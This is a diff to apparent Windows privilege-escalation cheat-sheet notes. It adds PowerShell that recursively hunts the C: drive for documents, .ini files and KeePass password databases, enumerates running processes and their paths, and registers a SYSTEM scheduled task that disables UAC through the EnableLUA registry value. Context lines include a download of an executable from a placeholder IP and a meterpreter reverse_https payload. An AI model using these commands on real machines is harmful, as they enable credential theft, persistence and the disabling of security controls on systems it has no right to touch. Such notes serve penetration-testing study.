@@ -26,11 +26,19 @@ cd $env:temp
 
 systeminfo
 
+Get-ComputerInfo
+
+# search for interesting files
+
+Get-ChildItem -Path C:\ -Include  *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.kdbx,*.ini -File -Recurse -ErrorAction SilentlyContinue
+
 # see also hidden files
 Get-ChildItem . -Force
 
 # download stuff if needed
 iwr -uri http://IP -outfile some.exe
+
+
 
 ```
 
@@ -91,9 +99,16 @@ Then look for vulnerable applications that are running.
 ### Find Process and its ACL
 
 ```powershell
-Get-Process | findstr paint
+
+
+Get-Process | Select-Object ProcessName, Path
 
 Get-Process -Name | Get-Acl
+
+Get-Process | ForEach-Object { $_.Path } 
+
+
+
 ```
 
 Process ID can be then correlated with what is installed and exposed.
@@ -143,6 +158,18 @@ windows/meterpreter/reverse_https
 
 * UAC can be bypassed using https://github.com/turbo/zero2hero
 OR 
+
+```powershell
+
+#turn of UAC triggering a scheduled task
+
+$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument 'Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0'
+$trigger = New-ScheduledTaskTrigger -AtStartup
+$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
+Register-ScheduledTask -TaskName "DisableUAC" -Action $action -Trigger $trigger -Principal $principal
+
+
+```
 
 # Antivirus
 
